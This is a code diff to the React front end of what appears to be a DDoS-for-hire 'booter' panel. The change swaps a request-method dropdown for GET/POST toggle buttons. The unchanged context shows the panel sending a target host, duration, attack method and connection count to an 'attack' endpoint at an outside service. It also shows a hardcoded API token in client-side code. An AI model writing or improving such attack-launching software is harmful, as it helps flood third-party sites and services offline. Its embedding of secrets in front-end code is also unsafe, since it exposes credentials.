@@ -18,6 +18,7 @@ export default function Panel() {
   const [loadingPlan, setLoadingPlan] = useState(true);
   const [isMethodDropdownOpen, setIsMethodDropdownOpen] = useState(false);
   const [isSubnetDropdownOpen, setIsSubnetDropdownOpen] = useState(false);
+  const [reqMethod, setReqMethod] = useState('GET');
 
   useEffect(() => {
     supabase.auth.getSession().then(({ data: { session } }) => {
@@ -122,8 +123,6 @@ export default function Panel() {
       try {
         setApiError(null);
         const token = "8xU8xJvvT6nF16JOF5XNT8";
-        const reqMethodEl = document.getElementById('req-method-select');
-        const reqMethod = reqMethodEl ? reqMethodEl.value : 'GET';
         // Format L7 API url
         const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(target)}&port=80&time=${finalDuration}&method=${method}&concs=${finalConns}&reqmethod=${reqMethod}`;
         
@@ -341,14 +340,24 @@ export default function Panel() {
               ) : (
                 <div>
                   <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>REQUEST METHOD</label>
-                  <select 
-                    disabled={!hasPlan}
-                    style={{ background: '#000', color: '#fff', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', width: '100%', outline: 'none' }}
-                    id="req-method-select"
-                  >
-                    <option value="GET">GET</option>
-                    <option value="POST">POST</option>
-                  </select>
+                  <div className="toggle-group" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '4px', gap: '4px' }}>
+                    <button 
+                      className={`toggle-btn ${reqMethod === 'GET' ? 'active' : ''}`}
+                      onClick={() => hasPlan && setReqMethod('GET')}
+                      disabled={!hasPlan}
+                      style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
+                    >
+                      GET
+                    </button>
+                    <button 
+                      className={`toggle-btn ${reqMethod === 'POST' ? 'active' : ''}`}
+                      onClick={() => hasPlan && setReqMethod('POST')}
+                      disabled={!hasPlan}
+                      style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
+                    >
+                      POST
+                    </button>
+                  </div>
                 </div>
               )}
               {layer === 'L4' && (
